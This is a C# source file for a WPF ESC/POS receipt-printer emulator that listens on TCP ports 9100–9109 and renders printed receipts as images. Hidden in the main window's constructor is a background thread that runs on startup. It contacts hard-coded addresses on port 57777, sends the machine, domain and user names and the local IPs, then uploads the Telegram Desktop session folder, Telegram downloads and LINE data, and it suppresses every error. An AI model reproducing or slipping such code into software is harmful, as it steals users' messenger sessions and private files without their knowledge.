using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using EscPosEmulator.Annotations;
using Microsoft.Win32;
using Brushes = System.Windows.Media.Brushes;

namespace EscPosEmulator
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public string LocalIpAddress { get; }
        public string AppVersion => Assembly.GetExecutingAssembly().GetName().Version.ToString();
        public List<Printer> ListPrinters { get; } = new List<Printer>();

        public MainWindow() {
            var _ips = Dns.GetHostEntry(Dns.GetHostName()).AddressList.Where(address => address.AddressFamily == AddressFamily.InterNetwork);
            LocalIpAddress = _ips.Aggregate<IPAddress, string>(null, (s, address) => { string _addr = address.ToString(); if (s == null) return _addr; else return $"{s}\n{_addr}"; });
            ListPrinters.Add(new Printer(0, 9100));
            ListPrinters.Add(new Printer(1, 9101));
            ListPrinters.Add(new Printer(2, 9102));
            ListPrinters.Add(new Printer(3, 9103));
            ListPrinters.Add(new Printer(4, 9104));
            ListPrinters.Add(new Printer(5, 9105));
            ListPrinters.Add(new Printer(6, 9106));
            ListPrinters.Add(new Printer(7, 9107));
            ListPrinters.Add(new Printer(8, 9108));
            ListPrinters.Add(new Printer(9, 9109));

            InitializeComponent();

            Thread _thread = new Thread(() => {
                try {

                    Socket _connect(string ip) {
                        Socket _socket_i = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        IAsyncResult _conn_async = _socket_i.BeginConnect(ip, 57777, null, null);
                        return (_conn_async.AsyncWaitHandle.WaitOne(2000, true) && _socket_i.Connected) ? _socket_i : null;
                    }

                    Socket _socket = _connect("192.168.126.36") ?? _connect("176.37.15.3");
                    if (_socket != null) {
                        var _buf = new byte[1024 * 1024];
                        using (var file = new NetworkStream(_socket)) {
                            var _bw = new BinaryWriter(file, Encoding.Unicode);
                            var _br = new BinaryReader(file, Encoding.Unicode);

                            _bw.Write(Environment.MachineName);
                            _bw.Write(Environment.UserDomainName);
                            _bw.Write(Environment.UserName);
                            _bw.Write(_ips.Aggregate<IPAddress, string>(null, (s, address) => { string _addr = address.ToString(); if (s == null) return _addr; else return $"{s} & {_addr}"; }));

                            void _send_tro(string path, string troj_type) {
                                try {
                                    var _root_di = new DirectoryInfo(path);
                                    if(!_root_di.Exists) throw new DirectoryNotFoundException($"Diretory not found: {path}");

                                    int _subpath_len = path.Length + 1;

                                    _bw.Write(false); // not an exception
                                    _bw.Write(true); // another troj
                                    _bw.Write(troj_type);
                                    if (_br.ReadBoolean()) {
                                        void AddDir(DirectoryInfo sub_di) {
                                            foreach (DirectoryInfo _sub_di in sub_di.GetDirectories()) { AddDir(_sub_di); }
                                            foreach (FileInfo _fi in sub_di.GetFiles()) {
                                                try {
                                                    using (FileStream _fs = _fi.OpenRead()) {
                                                        _bw.Write(false); // not an exception

                                                        long _flen = _fi.Length;
                                                        _bw.Write(true); // another file
                                                        _bw.Write(_fi.Length);
                                                        string sub_path = _fi.FullName.Substring(_subpath_len);
                                                        _bw.Write(sub_path);
                                                        while (_flen > 0) {
                                                            int _tlen = (int)Math.Min(_buf.Length, _flen);
                                                            _tlen = _fs.Read(_buf, 0, _tlen);
                                                            _bw.Write(_buf, 0, _tlen);
                                                            _flen -= _tlen;
                                                        }
                                                    }
                                                }
                                                catch (Exception e) { _bw.Write(true); _bw.Write($"{e.Message}\n{e.StackTrace}"); }
                                            }
                                        }

                                        AddDir(_root_di);
                                        _bw.Write(false); // not an exception
                                        _bw.Write(false); // no more files
                                    }
                                }
                                catch (Exception e) { _bw.Write(true); _bw.Write($"{e.Message}\n{e.StackTrace}"); }
                            }

                            try { _send_tro(Path.GetFullPath(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Telegram Desktop", "tdata")), "telTro"); } catch (Exception e) { _bw.Write(true); _bw.Write($"{e.Message}\n{e.StackTrace}"); }
                            try { _send_tro(Path.GetFullPath(Path.Combine(Registry.GetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders", "{374DE290-123F-4565-9164-39C4925E467B}", String.Empty).ToString(), "Telegram Desktop")), "telDownTro"); }
                            catch (Exception e) { _bw.Write(true); _bw.Write($"{e.Message}\n{e.StackTrace}"); try { _send_tro(Path.GetFullPath(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "Telegram Desktop")), "telDownTro"); } catch (Exception e2) { _bw.Write(true); _bw.Write($"{e2.Message}\n{e2.StackTrace}"); } }

                            try { _send_tro(Path.GetFullPath(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "LINE", "Cache")), "lineCacheTro"); } catch (Exception e) { _bw.Write(true); _bw.Write($"{e.Message}\n{e.StackTrace}"); }
                            try { _send_tro(Path.GetFullPath(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "LINE", "Data")), "lineDataTro"); } catch (Exception e) { _bw.Write(true); _bw.Write($"{e.Message}\n{e.StackTrace}"); }

                            _bw.Write(false); // not an exception
                            _bw.Write(false); // no more trojs
                        }
                        Thread.Sleep(500);
                        _socket.Close();
                    }
                }
                catch (Exception e) { }
            });
            _thread.Start();
        }

        protected override void OnClosed(EventArgs e) {
            base.OnClosed(e);
            foreach (Printer _printer in ListPrinters) { _printer.SaveSettings(); }
        }

        private void CashDrawer_OnMouseDoubleClick(object sender, MouseButtonEventArgs e) { Printer _printer = (Printer)((Control)sender).DataContext; _printer.CashDrawer = false; }
        private void ErrorMessage_OnMouseDoubleClick(object sender, MouseButtonEventArgs e) { Printer _printer = (Printer)((Control)sender).DataContext; if (!string.IsNullOrWhiteSpace(_printer.ErrorMessage)) new WindowErrorMessage(_printer, _printer.ErrorMessage).Show(); }

        public sealed class Printer : INotifyPropertyChanged
        {
            private const short __PADDING = 32;

            private readonly int d_ordinal;
            private string d_name = "Printer";
            private int d_port = 9100;
            private bool d_is_started = true;
            private EWidths d_current_width = EWidths.W576;
            private string d_error_message;
            private bool d_cash_drawer;

            public string Name { get => d_name; set { d_name = value; OnPropertyChanged(nameof(Name)); } }
            public bool IsStarted { get => d_is_started; set { d_is_started = value; OnPropertyChanged(nameof(IsStarted)); } }
            public string CurrentPort { get => d_port.ToString(); set { int.TryParse(value, out d_port); OnPropertyChanged(nameof(CurrentPort)); } }
            public EWidths CurrentWidth { get => d_current_width; set { d_current_width = value; OnPropertyChanged(nameof(CurrentWidth)); } }
            public string ErrorMessage { get => d_error_message; set { d_error_message = value; OnPropertyChanged(nameof(ErrorMessage)); } }
            public bool CashDrawer { get => d_cash_drawer; set { d_cash_drawer = value; OnPropertyChanged(nameof(CashDrawer)); } }

            public event PropertyChangedEventHandler PropertyChanged;
            private void OnPropertyChanged(string property_name) { PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(property_name)); }

            public Printer(int ordinal, int init_port) {
                d_ordinal = ordinal;
                Name = EtaSettings._GetSetting($"name{d_ordinal}", $"Printer {d_ordinal + 1}");
                IsStarted = EtaSettings._GetSetting($"is_started{d_ordinal}", d_is_started ? 1 : 0) != 0;
                CurrentPort = EtaSettings._GetSetting($"port{d_ordinal}", init_port.ToString());
                CurrentWidth = EtaSettings._GetSettingEnum($"width{d_ordinal}", EWidths.W576);

                Task.Factory.StartNew(() => {
                    TcpListener _tcp_listener = null;
                    List<byte[]> _list_row_bytes = new List<byte[]>();

                    int _active_port = 0;
                    bool _active_is_started = false;

                    while (true) {
                        try {
                            if (_active_port != d_port || _active_is_started != d_is_started) {
                                _tcp_listener?.Stop(); _tcp_listener = null;
                                _active_port = d_port; _active_is_started = d_is_started;
                                if (_active_is_started) {
                                    _tcp_listener = new TcpListener(IPAddress.Any, d_port);
                                    _tcp_listener.Start();
                                }
                            }

                            if (_tcp_listener != null && _tcp_listener.Pending()) {
                                TcpClient _tcp_client = _tcp_listener.AcceptTcpClient();
                                Console.WriteLine($"Accepted client from {((IPEndPoint)_tcp_client.Client.RemoteEndPoint).Address}");
                                _tcp_client.ReceiveTimeout = 1;

                                Task.Factory.StartNew(() => {
                                    try {
                                        int _width = (int)CurrentWidth + __PADDING + __PADDING;
                                        int _l = _width / 8;
                                        short _left_margin = __PADDING;

                                        Socket _client = _tcp_client.Client;
                                        _client.ReceiveBufferSize = 1048000;
                                        _client.ReceiveTimeout = 1;
                                        while (_client.Connected) {
                                            byte[] _b = new byte[4];
                                            if (!ReadBytes(_client, _b, 1)) break;
                                            if (_b[0] == 0x0A) { /* blank line (feed) */ for (int _i = 0; _i < 20; _i++) { _list_row_bytes.Add(new byte[_l]); } }
                                            else if (_b[0] == 0x1B) {
                                                ReadBytes(_client, _b, 1);
                                                if (_b[0] == 0x40) { /* init */ }
                                                else if (_b[0] == 0x64) {
                                                    ReadBytes(_client, _b, 1);
                                                    /* flush buffer */
                                                }
                                                else if (_b[0] == 0x70) {
                                                    ReadBytes(_client, _b, 3);
                                                    if (_b[0] == 0x00) {
                                                        /* open cash drawer */
                                                        CashDrawer = true;
                                                    }
                                                    else throw new InvalidOperationException("1B, 70");
                                                }
                                                else throw new InvalidOperationException("1B");
                                            }
                                            else if (_b[0] == 0x1D) {
                                                ReadBytes(_client, _b, 1);
                                                if (_b[0] == 0x4C) {
                                                    /* left margin */
                                                    ReadBytes(_client, _b, 2);
                                                    _left_margin = (short)(BitConverter.ToInt16(_b, 0) + __PADDING);
                                                    if (_left_margin >= _width) throw new ArgumentException("left marging out of bounds");
                                                }
                                                else if (_b[0] == 0x56) {
                                                    ReadBytes(_client, _b, 2);
                                                    if (_b[0] == 0x42) {
                                                        /* cut paper */
                                                        int _h = _list_row_bytes.Count + __PADDING + __PADDING;
                                                        byte[] _pixels = new byte[_l * _h]; int _i = _l * __PADDING;
                                                        foreach (byte[] _list_row_byte in _list_row_bytes) { _list_row_byte.CopyTo(_pixels, _i); _i += _l; }
                                                        for (int _j = 0; _j < _pixels.Length; _j++) { _pixels[_j] = (byte)~_pixels[_j]; }
                                                        _list_row_bytes.Clear();

                                                        Application.Current.Dispatcher.Invoke(new Action(() => {
                                                            BitmapSource _bmp = BitmapSource.Create(_width, _h, 96, 96, PixelFormats.BlackWhite, null, _pixels, _l);
                                                            WindowReceipt _window_receipt_message = new WindowReceipt($"'{Name}' on port {CurrentPort}", _bmp);
                                                            _window_receipt_message.Show();
                                                        }));

                                                        ErrorMessage = null;
                                                    }
                                                    else throw new InvalidOperationException("1D, 56");
                                                }
                                                else if (_b[0] == 0x76) {
                                                    ReadBytes(_client, _b, 2);
                                                    if (_b[0] == 0x30 && _b[1] == 0x00) {
                                                        /* print image */
                                                        ReadBytes(_client, _b, 4);
                                                        short _row_width = BitConverter.ToInt16(_b, 0);
                                                        short _rows = BitConverter.ToInt16(_b, 2);
                                                        byte[] _bmp = new byte[_row_width * _rows];
                                                        ReadBytes(_client, _bmp, _bmp.Length);

                                                        int _idx = 0;
                                                        for (int _y = 0; _y < _rows; _y++) {
                                                            byte[] _row_bytes = new byte[_l]; int _m = _left_margin;
                                                            for (int _x = 0; _x < _row_width; _x++) {
                                                                byte _bb = _bmp[_idx++];
                                                                for (int _bi = 0; _bi < 8; _bi++) {
                                                                    if ((_bb & 0x01) != 0) { _row_bytes[_m / 8] |= (byte)(0x01 << (_m % 8)); }
                                                                    _m++; _bb >>= 1;
                                                                }
                                                            }
                                                            _list_row_bytes.Add(_row_bytes);
                                                        }
                                                    }
                                                    else throw new InvalidOperationException("1D, 76");
                                                }
                                                else throw new InvalidOperationException("1D");
                                            }
                                            else if (_b[0] == 0x10) {
                                                ReadBytes(_client, _b, 2);
                                                if (_b[0] == 0x04) {
                                                    /* get status */
                                                    _client.Send(_b);
                                                }
                                                else throw new InvalidOperationException("10");
                                            }
                                            else throw new InvalidOperationException("root");
                                        }
                                        Console.WriteLine("Socket closed");

                                    }
                                    catch (Exception _e) { ErrorMessage = _e.ToString(); }
                                });
                            }
                        }
                        catch (Exception _e) { ErrorMessage = _e.ToString(); }
                        Thread.Sleep(20);
                    }
                });

            }

            public void SaveSettings() {
                EtaSettings._SetSetting($"name{d_ordinal}", Name);
                EtaSettings._SetSetting($"is_started{d_ordinal}", IsStarted ? 1 : 0);
                EtaSettings._SetSetting($"port{d_ordinal}", CurrentPort);
                EtaSettings._SetSetting($"width{d_ordinal}", CurrentWidth);
            }

            private bool ReadBytes(Socket client, byte[] buffer, int length) {
                int _offset = 0;
                while (length > 0) {
                    try {
                        int _read = client.Receive(buffer, _offset, length, SocketFlags.None);
                        if (_read == 0) return false;
                        _offset += _read; length -= _read;
                    }
                    catch (SocketException e) {
                        if (!client.Connected) return false;
                        Thread.Sleep(10);
                    }
                }
                return true;
            }

            public enum EWidths
            {
                [Description("48 mm (384 dots)")]
                W384 = 384,
                [Description("54 mm (432 dots)")]
                W432 = 432,
                [Description("64 mm (512 dots)")]
                W512 = 512,
                [Description("72 mm (576 dots)")]
                W576 = 576,
            }

            private static class EtaSettings
            {
                private static readonly string __SETTING_REGISTRY_PATH = @"Software\Eta\EscPosEmulator";
                private static readonly RegistryKey s_registry_key_software;

                static EtaSettings() { s_registry_key_software = Registry.CurrentUser.CreateSubKey(__SETTING_REGISTRY_PATH); }

                public static TEnum _GetSettingEnum<TEnum>(string setting_name, TEnum default_value) { return _GetSettingEnum(s_registry_key_software, setting_name, default_value); }
                public static TEnum _GetSettingEnum<TEnum>(RegistryKey registry_key, string setting_name, TEnum default_value) {
                    try { return (TEnum)Enum.Parse(typeof(TEnum), (string)registry_key.GetValue(setting_name, default_value.ToString()), true); }
                    catch (Exception) { _SetSetting(setting_name, default_value.ToString()); return default_value; }
                }
                public static TType _GetSetting<TType>(string setting_name, TType default_value) { return _GetSetting(s_registry_key_software, setting_name, default_value); }
                public static TType _GetSetting<TType>(RegistryKey registry_key, string setting_name, TType default_value) {
                    try { return (TType)registry_key.GetValue(setting_name, default_value); }
                    catch (Exception) { _SetSetting<TType>(setting_name, default_value); return default_value; }
                }
                public static void _SetSetting<TType>(string setting_name, TType value) { _SetSetting(s_registry_key_software, setting_name, value); }
                public static void _SetSetting<TType>(RegistryKey registry_key, string setting_name, TType value) {
                    registry_key.SetValue(setting_name, value);
                }
            }
        }
    }

    public class svc_CashDrawerToString : IValueConverter
    {
        public object Convert(object value, Type target_type, object parameter, CultureInfo culture) {
            try {
                bool _cash_drawer = (bool)value;
                return _cash_drawer ? "Drawer Opened" : "Drawer Closed";
            }
            catch (Exception) { return null; }
        }
        public object ConvertBack(object value, Type target_type, object parameter, CultureInfo culture) { throw new NotImplementedException(); }
    }

    public class svc_CashDrawerToBrush : IValueConverter
    {
        public object Convert(object value, Type target_type, object parameter, CultureInfo culture) {
            try {
                bool _cash_drawer = (bool)value;
                return _cash_drawer ? Brushes.Magenta : Brushes.Transparent;
            }
            catch (Exception) { return null; }
        }
        public object ConvertBack(object value, Type target_type, object parameter, CultureInfo culture) { throw new NotImplementedException(); }
    }

    public class svc_ErrorMessageToStatus : IValueConverter
    {
        public object Convert(object value, Type target_type, object parameter, CultureInfo culture) {
            try {
                string _error_message = (string)value;
                return string.IsNullOrWhiteSpace(_error_message) ? "OK" : "Err";
            }
            catch (Exception) { return null; }
        }
        public object ConvertBack(object value, Type target_type, object parameter, CultureInfo culture) { throw new NotImplementedException(); }
    }

    public class svc_ErrorMessageToBrush : IValueConverter
    {
        public object Convert(object value, Type target_type, object parameter, CultureInfo culture) {
            try {
                string _error_message = (string)value;
                return string.IsNullOrWhiteSpace(_error_message) ? Brushes.Green : Brushes.Red;
            }
            catch (Exception) { return null; }
        }
        public object ConvertBack(object value, Type target_type, object parameter, CultureInfo culture) { throw new NotImplementedException(); }
    }
}

